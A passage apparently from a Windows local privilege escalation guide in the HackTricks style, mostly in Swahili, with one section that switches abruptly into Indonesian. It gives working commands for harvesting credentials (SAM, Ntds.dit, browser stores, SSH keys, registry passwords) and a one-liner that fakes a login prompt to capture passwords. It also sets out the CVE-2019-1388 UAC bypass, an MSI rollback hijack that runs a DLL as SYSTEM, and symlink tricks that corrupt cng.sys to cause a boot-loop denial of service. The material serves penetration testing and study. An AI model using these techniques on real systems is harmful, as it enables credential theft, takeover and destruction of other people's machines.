[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Rekodi
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Omba vitambulisho

Unaweza kila wakati **kumwomba mtumiaji aingize vitambulisho vyake au hata vitambulisho vya mtumiaji mwingine** ikiwa unafikiri anaweza kuvijua (kumbuka kwamba **kuomba** mteja moja kwa moja **vitambulisho** ni jambo la **hatari** sana):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Majina ya faili yanayowezekana yaliyo na credentials**

Faili zinazojulikana ambazo wakati fulani uliopita zilikuwa na **passwords** kwa **clear-text** au **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Tafuta faili zote zilizopendekezwa:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Vitambulisho ndani ya RecycleBin

Unapaswa pia kuangalia Bin ili kutafuta vitambulisho vilivyomo ndani yake

Ili **kurejesha nenosiri** zilizohifadhiwa na programu kadhaa unaweza kutumia: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Ndani ya registry

**Vifunguo vingine vinavyowezekana vya registry vyenye vitambulisho**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### **Historia ya Browsers**

Unapaswa kuangalia dbs ambapo passwords kutoka **Chrome or Firefox** zimehifadhiwa.\
Pia angalia history, bookmarks na favourites za browsers ili labda baadhi ya **passwords are** zimehifadhiwa huko.

Tools za kutoa passwords kutoka browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** ni technology iliyojengwa ndani ya Windows operating system ambayo huruhusu **intercommunication** kati ya software components za lugha tofauti. Kila COM component hutambuliwa kupitia **class ID (CLSID)** na kila component hutoa functionality kupitia interfaces moja au zaidi, zinazotambuliwa kupitia interface IDs (IIDs).

COM classes na interfaces zimefafanuliwa kwenye registry chini ya **HKEY\CLASSES\ROOT\CLSID** na **HKEY\CLASSES\ROOT\Interface** mtawalia. Registry hii huundwa kwa kuunganisha **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Ndani ya CLSIDs za registry hii unaweza kupata child registry **InProcServer32** ambayo ina **default value** inayoelekeza kwenye **DLL** na value inayoitwa **ThreadingModel** ambayo inaweza kuwa **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) au **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

Kimsingi, kama unaweza **overwrite any of the DLLs** ambazo zitatekelezwa, unaweza **escalate privileges** ikiwa DLL hiyo itatekelezwa na user tofauti.

Ili kujifunza jinsi attackers wanavyotumia COM Hijacking kama persistence mechanism angalia:


{{#ref}}
com-hijacking.md
{{endref}}

### **Utafutaji wa Generic Password katika files na registry**

**Search for file contents**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Tafuta faili lenye jina fulani**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Tafuta registry kwa majina ya key na passwords**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Zana zinazotafuta passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin nimeunda plugin hii ili **kuendesha kiotomatiki kila module ya metasploit POST inayotafuta credentials** ndani ya victim.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) hutafuta kiotomatiki faili zote zilizo na passwords zilizotajwa kwenye ukurasa huu.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ni tool nyingine nzuri ya kutoa password kutoka kwenye system.

Tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) hutafuta **sessions**, **usernames** na **passwords** za tools kadhaa zinazohifadhi data hii kwa clear text (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Fikiria kwamba **mchakato unaoendeshwa kama SYSTEM unafungua mchakato mpya** (`OpenProcess()`) **wenye ufikiaji kamili**. Mchakato huohuo pia **unaunda mchakato mpya** (`CreateProcess()`) **wenye priviliji za chini lakini ukirithi zote open handles za mchakato mkuu**.\
Kisha, ukiwa na **ufikiaji kamili kwa mchakato wenye priviliji za chini**, unaweza kuchukua **open handle kwa mchakato wenye priviliji uliofanywa** kwa `OpenProcess()` na **kuingiza shellcode**.\
[Soma mfano huu kwa maelezo zaidi kuhusu **jinsi ya kugundua na kuitumia exploit vulnerability hii**.](leaked-handle-exploitation.md)\
[Soma **post hii nyingine kwa maelezo kamili zaidi kuhusu jinsi ya kujaribu na kutumia vibaya open handlers zaidi za processes na threads zilizorithiwa zenye viwango tofauti vya permissions (sio full access tu)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Sehemu za shared memory, zinazoitwa **pipes**, huwezesha mawasiliano ya process na uhamishaji wa data.

Windows hutoa feature inayoitwa **Named Pipes**, inayoruhusu processes zisizohusiana kushiriki data, hata kupitia mitandao tofauti. Hii inafanana na client/server architecture, zikiwa na majukumu yaliyofafanuliwa kama **named pipe server** na **named pipe client**.

Data inapopelekwa kupitia pipe na **client**, **server** iliyoseti pipe hiyo ina uwezo wa **kuchukua identity** ya **client**, ikiwa ina **SeImpersonate** rights zinazohitajika. Kutambua **mchakato wenye priviliji** unaowasiliana kupitia pipe unayoweza kuiga kunatoa fursa ya **kupata priviliji za juu zaidi** kwa kuchukua identity ya mchakato huo mara tu unapoingiliana na pipe ulioanzisha. Kwa maelekezo ya kutekeleza shambulio kama hilo, miongozo yenye msaada inaweza kupatikana [**hapa**](named-pipe-client-impersonation.md) na [**hapa**](#from-high-integrity-to-system).

Pia zana ifuatayo inaruhusu **intercept mawasiliano ya named pipe kwa zana kama burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **na zana hii inaruhusu kuorodhesha na kuona pipes zote ili kupata privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Huduma ya Telephony (TapiSrv) katika hali ya server inafichua `\\pipe\\tapsrv` (MS-TRP). Mteja wa mbali aliyeidhinishwa anaweza kutumia njia ya async event inayotegemea mailslot kugeuza `ClientAttach` kuwa **4-byte write** ya kiholela kwa faili yoyote iliyopo inayoweza kuandikwa na `NETWORK SERVICE`, kisha kupata rights za Telephony admin na kupakia DLL ya kiholela kama huduma. Mtiririko kamili:

- `ClientAttach` ikiwa na `pszDomainUser` iliyowekwa kwenye path iliyopo inayoweza kuandikwa → huduma inafungua kupitia `CreateFileW(..., OPEN_EXISTING)` na kuitumia kwa async event writes.
- Kila event huandika `InitContext` inayodhibitiwa na mshambulizi kutoka `Initialize` kwenye handle hiyo. Sajili line app kwa `LRegisterRequestRecipient` (`Req_Func 61`), anzisha `TRequestMakeCall` (`Req_Func 121`), chukua kupitia `GetAsyncEvents` (`Req_Func 0`), kisha unregister/shutdown ili kurudia deterministic writes.
- Ongeza wewe mwenyewe kwenye `[TapiAdministrators]` katika `C:\Windows\TAPI\tsec.ini`, unganisha tena, kisha piga `GetUIDllName` na path ya DLL ya kiholela ili kutekeleza `TSPI_providerUIIdentify` kama `NETWORK SERVICE`.

Maelezo zaidi:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

Angalia ukurasa **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Clickable Markdown links zilizopitishwa kwa `ShellExecuteExW` zinaweza kuchochea dangerous URI handlers (`file:`, `ms-appinstaller:` au scheme yoyote iliyosajiliwa) na kutekeleza files zinazodhibitiwa na mshambulizi kama current user. Tazama:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

Unapopata shell kama user, huenda kukawa na scheduled tasks au processes nyingine zinazoendeshwa ambazo **hupitisha credentials kwenye command line**. Script iliyo hapa chini hukusanya process command lines kila baada ya sekunde mbili na kulinganisha hali ya sasa na hali ya awali, ikitoa tofauti zozote.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Kuiba passwords kutoka kwa processes

## Kutoka Low Priv User hadi NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Ikiwa una access kwenye graphical interface (kupitia console au RDP) na UAC imewezeshwa, katika baadhi ya versions za Microsoft Windows inawezekana kuendesha terminal au process nyingine yoyote kama "NT\AUTHORITY SYSTEM" kutoka kwa user asiye na privileges.

Hii hufanya iwezekane kuongeza privileges na bypass UAC wakati huohuo kwa kutumia vulnerability ileile. Zaidi ya hayo, hakuna haja ya kusakinisha chochote na binary inayotumiwa wakati wa process hiyo, imesainiwa na imetolewa na Microsoft.

Baadhi ya systems zilizoathirika ni zifuatazo:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Ili kutumia udhaifu huu, ni lazima kutekeleza hatua zifuatazo:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## Kutoka Administrator Medium kwenda High Integrity Level / UAC Bypass

Soma hili ili **kujifunza kuhusu Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Kisha **soma hili ili kujifunza kuhusu UAC na UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Kutoka Arbitrary Folder Delete/Move/Rename kwenda SYSTEM EoP

Technique iliyoelezwa [**kwenye blog post hii**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) na exploit code [**inapatikana hapa**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Shambulio hili kimsingi linajumuisha kutumia vibaya rollback feature ya Windows Installer ili kubadilisha legitimate files na zile malicious wakati wa mchakato wa uninstallation. Kwa hili attacker anahitaji kuunda **malicious MSI installer** ambayo itatumika kuhijack folda `C:\Config.Msi`, ambayo baadaye itatumiwa na Windows Installer kuhifadhi rollback files wakati wa uninstallation ya MSI packages nyingine ambapo rollback files zitakuwa zimebadilishwa ili kubeba malicious payload.

Technique iliyofupishwa ni hii ifuatayo:

1. **Stage 1 – Kujiandaa kwa Hijack (acha `C:\Config.Msi` ikiwa empty)**

- Step 1: Install MSI
- Unda `.msi` inayosinstall file isiyo na madhara (kwa mfano, `dummy.txt`) kwenye folda inayoweza kuandikwa (`TARGETDIR`).
- Weka installer kama **"UAC Compliant"**, ili **non-admin user** aweze kuiendesha.
- Acha **handle** ikiwa open kwa file baada ya install.

- Step 2: Anza Uninstall
- Uninstall `.msi` hiyo hiyo.
- Mchakato wa uninstall unaanza kuhamisha files kwenda `C:\Config.Msi` na kuzi-rename kuwa files za `.rbf` (rollback backups).
- **Poll open file handle** kwa kutumia `GetFinalPathNameByHandle` ili kugundua wakati file inakuwa `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- `.msi` inajumuisha **custom uninstall action (`SyncOnRbfWritten`)** ambayo:
- Husignali wakati `.rbf` imeandikwa.
- Kisha **husubiri** event nyingine kabla ya kuendelea na uninstall.

- Step 4: Zuia Ufutaji wa `.rbf`
- Inaposignaliwa, **fungua file ya `.rbf`** bila `FILE_SHARE_DELETE` — hii **huzuia kufutwa** kwake.
- Kisha **signali back** ili uninstall iweze kumalizika.
- Windows Installer hushindwa kufuta `.rbf`, na kwa sababu haiwezi kufuta contents zote, **`C:\Config.Msi` haiondolewi**.

- Step 5: Futa `.rbf` kwa Mikono
- Wewe (attacker) unafuta file ya `.rbf` kwa mikono.
- Sasa **`C:\Config.Msi` ni empty**, tayari ku-hijack.

> Katika hatua hii, **trigger SYSTEM-level arbitrary folder delete vulnerability** ili kufuta `C:\Config.Msi`.

2. **Stage 2 – Kubadilisha Rollback Scripts na Zenye Malicious**

- Step 6: Unda upya `C:\Config.Msi` na Weak ACLs
- Unda upya folda `C:\Config.Msi` mwenyewe.
- Weka **weak DACLs** (kwa mfano, Everyone:F), na **weka handle open** na `WRITE_DAC`.

- Step 7: Endesha Install Nyingine
- Install `.msi` tena, na:
- `TARGETDIR`: eneo linaloweza kuandikwa.
- `ERROROUT`: variable inayosababisha forced failure.
- Install hii itatumika ku-trigger **rollback** tena, ambayo husoma `.rbs` na `.rbf`.

- Step 8: Fuatilia `.rbs`
- Tumia `ReadDirectoryChangesW` kufuatilia `C:\Config.Msi` hadi `.rbs` mpya ionekane.
- Kamata filename yake.

- Step 9: Sync Kabla ya Rollback
- `.msi` ina **custom install action (`SyncBeforeRollback`)** ambayo:
- Husignali event wakati `.rbs` imeundwa.
- Kisha **husubiri** kabla ya kuendelea.

- Step 10: Reapply Weak ACL
- Baada ya kupokea event ya `.rbs created`:
- Windows Installer **hureapply strong ACLs** kwa `C:\Config.Msi`.
- Lakini kwa kuwa bado una handle yenye `WRITE_DAC`, unaweza **ku-reapply weak ACLs** tena.

> ACLs **huzingatiwa tu wakati wa handle open**, hivyo bado unaweza kuandika kwenye folda.

- Step 11: Dondosha Fake `.rbs` na `.rbf`
- Overwrite file ya `.rbs` na **fake rollback script** inayomwambia Windows:
- Rudisha file yako ya `.rbf` (malicious DLL) kwenda kwenye **privileged location** (kwa mfano, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Dondosha fake `.rbf` yako yenye **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger Rollback
- Signali sync event ili installer iendelee.
- **type 19 custom action (`ErrorOut`)** imewekwa ili **ku-fail intentionally** install kwenye point inayojulikana.
- Hii husababisha **rollback kuanza**.

- Step 13: SYSTEM Inasinstall DLL Yako
- Windows Installer:
- Husoma malicious `.rbs` yako.
- Hu-copy DLL yako ya `.rbf` kwenda target location.
- Sasa una **malicious DLL yako kwenye SYSTEM-loaded path**.

- Hatua ya Mwisho: Execute SYSTEM Code
- Endesha trusted **auto-elevated binary** (kwa mfano, `osk.exe`) ambayo hupakia DLL uliyo-hijack.
- **Boom**: Code yako inatekelezwa **kama SYSTEM**.


### Kutoka Arbitrary File Delete/Move/Rename kwenda SYSTEM EoP

Main MSI rollback technique (iliyo juu) inadhania unaweza kufuta **folda nzima** (kwa mfano, `C:\Config.Msi`). Lakini je, vulnerability yako inaruhusu tu **arbitrary file deletion** ?

Unaweza kutumia vibaya **NTFS internals**: kila folda ina hidden alternate data stream inayoitwa:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Mtiririko huu huhifadhi **index metadata** ya folda.

Kwa hivyo, ukifuta mtiririko wa `::$INDEX_ALLOCATION` wa folda, NTFS **huondoa folda nzima** kutoka kwenye filesystem.

Unaweza kufanya hivi kwa kutumia standard file deletion APIs kama:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Hata kama unaita API ya kufuta *file*, bado **inafuta folda yenyewe**.

### Kutoka Kufuta Contents za Folder hadi SYSTEM EoP
Je, ikiwa primitive yako haikuruhusu kufuta files/folders za kiholela, lakini **inaruhusu kufuta *contents* za folder iliyo chini ya udhibiti wa mshambuliaji**?

1. Hatua 1: Sanidi folder na file ya chambo
- Unda: `C:\temp\folder1`
- Ndani yake: `C:\temp\folder1\file1.txt`

2. Hatua 2: Weka **oplock** kwenye `file1.txt`
- Oplock **inasitisha execution** wakati process yenye privilege inapojaribu kufuta `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Hatua ya 3: Anzisha mchakato wa SYSTEM (k.m., `SilentCleanup`)
- Mchakato huu huchanganua folda (k.m., `%TEMP%`) na kujaribu kufuta yaliyomo.
- Unapofikia `file1.txt`, **oplock triggers** na hukabidhi udhibiti kwa callback yako.

4. Hatua ya 4: Ndani ya callback ya oplock – elekeza ufutaji upya

- Chaguo A: Hamisha `file1.txt` kwingine
- Hii huondoa yaliyomo ya `folder1` bila kuvunja oplock.
- Usiifute `file1.txt` moja kwa moja — hilo lingetoa oplock mapema sana.

- Chaguo B: Badilisha `folder1` kuwa **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Option C: Tengeneza **symlink** katika `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Hii inalenga mtiririko wa ndani wa NTFS unaohifadhi metadata ya folda — kuufuta huifuta folda.

5. Step 5: Release the oplock
- Mchakato wa SYSTEM unaendelea na unajaribu kufuta `file1.txt`.
- Lakini sasa, kutokana na junction + symlink, kwa kweli unafuta:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Result**: `C:\Config.Msi` inafutwa na SYSTEM.

### Kutoka Arbitrary Folder Create hadi Permanent DoS

Tumia primitive inayokuruhusu **kuunda folder yoyote kama SYSTEM/admin** — hata kama **huwezi kuandika files** au **kuweka weak permissions**.

Unda **folder** (sio file) lenye jina la **critical Windows driver**, kwa mfano:
```
C:\Windows\System32\cng.sys
```
- Jalur ini biasanya sesuai dengan driver mode kernel `cng.sys`.
- Jika Anda **membuatnya terlebih dahulu sebagai folder**, Windows gagal memuat driver asli saat boot.
- Lalu, Windows mencoba memuat `cng.sys` saat boot.
- Windows melihat folder itu, **gagal menemukan driver asli**, dan **crash atau menghentikan boot**.
- Tidak ada **fallback**, dan **tidak ada recovery** tanpa intervensi eksternal (mis. boot repair atau akses disk).

### Dari jalur log/backup yang privileged + OM symlinks ke arbitrary file overwrite / boot DoS

Saat sebuah **privileged service** menulis log/exports ke path yang dibaca dari **writable config**, alihkan path itu dengan **Object Manager symlinks + NTFS mount points** untuk mengubah write yang privileged menjadi arbitrary overwrite (bahkan **tanpa** SeCreateSymbolicLinkPrivilege).

**Requirements**
- Config yang menyimpan target path dapat ditulis oleh attacker (mis. `%ProgramData%\...\.ini`).
- Kemampuan membuat mount point ke `\RPC Control` dan OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Operasi privileged yang menulis ke path itu (log, export, report).

**Example chain**
1. Baca config untuk mendapatkan destination log yang privileged, mis. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` di `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Redirect path tanpa admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Subiri component yenye privilege iandike log (km., admin achochee "send test SMS"). Uandishi sasa unaishia katika `C:\Windows\System32\cng.sys`.
4. Kagua lengo lililoandikwa juu yake (hex/PE parser) kuthibitisha corruption; reboot hulazimisha Windows kupakia path ya driver iliyoharibiwa → **boot loop DoS**. Hii pia inatumika kwa ujumla kwa faili yoyote iliyolindwa ambayo service yenye privilege itafungua kwa ajili ya write.

> `cng.sys` kwa kawaida hupakiwa kutoka `C:\Windows\System32\drivers\cng.sys`, lakini kama kuna copy katika `C:\Windows\System32\cng.sys` inaweza kujaribiwa kwanza, na kufanya iwe sink ya kuaminika ya DoS kwa data iliyoharibika.



## **From High Integrity to System**

### **New service**

Kama tayari unaendelea kwenye process ya High Integrity, **path to SYSTEM** inaweza kuwa rahisi kwa **kuunda na kuendesha service mpya**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Unapounda binary ya service hakikisha ni service halali au kwamba binary inatekeleza vitendo vinavyohitajika haraka kwani itauawa ndani ya 20s ikiwa si service halali.

### AlwaysInstallElevated

Kutoka kwenye process ya High Integrity unaweza kujaribu **kuwezesha AlwaysInstallElevated registry entries** na **kusakinisha** reverse shell kwa kutumia wrapper ya _**.msi**_.\
[Maelezo zaidi kuhusu registry keys zinazohusika na jinsi ya kusakinisha package ya _.msi_ hapa.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Unaweza** [**kuta code hapa**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Ukijua hizo token privileges (huenda utazipata kwenye process iliyokwisha kuwa High Integrity), utaweza **kufungua karibu process yoyote** (si protected processes) kwa kutumia SeDebug privilege, **kunakili token** ya process hiyo, na kuunda **arbitrary process kwa token hiyo**.\
Kwa kawaida mbinu hii **huchagua process yoyote inayoendeshwa kama SYSTEM ikiwa na token privileges zote** (_ndiyo, unaweza kupata SYSTEM processes bila token privileges zote_).\
**Unaweza kupata** [**mfano wa code inayotekeleza mbinu iliyopendekezwa hapa**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Mbinu hii hutumiwa na meterpreter ili kuongeza privileges katika `getsystem`. Mbinu hii inajumuisha **kuunda pipe na kisha kuunda/kutumia vibaya service ili iandike kwenye pipe hiyo**. Kisha, **server** iliyounda pipe kwa kutumia privilege ya **`SeImpersonate`** itaweza **kuimpersonate token** ya client wa pipe (service) na kupata SYSTEM privileges.\
Ukitaka [**kujifunza zaidi kuhusu name pipes unapaswa kusoma hii**](#named-pipe-client-impersonation).\
Ukitaka kusoma mfano wa [**jinsi ya kutoka high integrity hadi System kwa kutumia name pipes unapaswa kusoma hii**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ukiweza **kuihijack dll** inayokuwa **loaded** na **process** inayoendeshwa kama **SYSTEM** utaweza kutekeleza code yoyote kwa ruhusa hizo. Hivyo Dll Hijacking pia ni muhimu kwa aina hii ya privilege escalation, na zaidi ya hapo, mara nyingi ni **rahisi zaidi kufanikisha kutoka kwenye process ya high integrity** kwani itakuwa na **write permissions** kwenye folda zinazotumika kupakia dlls.\
**Unaweza** [**kujifunza zaidi kuhusu Dll hijacking hapa**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Soma:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Angalia misconfigurations na sensitive files (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Angalia baadhi ya misconfigurations zinazowezekana na kukusanya info (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Angalia misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Hutoa taarifa za sessions zilizohifadhiwa za PuTTY, WinSCP, SuperPuTTY, FileZilla, na RDP. Tumia -Thorough kwenye local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Hutoa crendentials kutoka Credential Manager. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray passwords zilizokusanywa kwenye domain nzima**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ni PowerShell ADIDNS/LLMNR/mDNS spoofer na man-in-the-middle tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basic privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Tafuta known privesc vulnerabilities (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Tafuta known privesc vulnerabilities (needs to be compiled using VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
